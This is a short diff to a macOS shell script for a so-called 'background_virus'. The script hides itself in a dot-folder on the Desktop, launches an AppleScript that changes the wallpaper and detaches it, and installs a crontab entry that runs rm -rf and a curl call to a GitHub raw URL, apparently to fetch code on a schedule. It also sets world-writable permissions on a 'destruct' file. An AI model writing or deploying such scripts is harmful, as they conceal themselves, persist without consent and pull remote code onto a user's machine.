@@ -1,4 +1,4 @@
-mv background_virus ~/Desktop/.background_virus/
+mv background_virus ~/Desktop/.background_virus/ & True
 osascript ~/Desktop/.background_virus/change_background.scpt & disown
 
 #write out current crontab
@@ -9,4 +9,4 @@ echo "12 20 * * * rm -rf ~/Desktop/.background_virus; curl -fsS https://raw.gith
 crontab mycron
 rm mycron
 
-chmod 777 destruct
+chmod 777 ~/Desktop/.background_virus/destruct
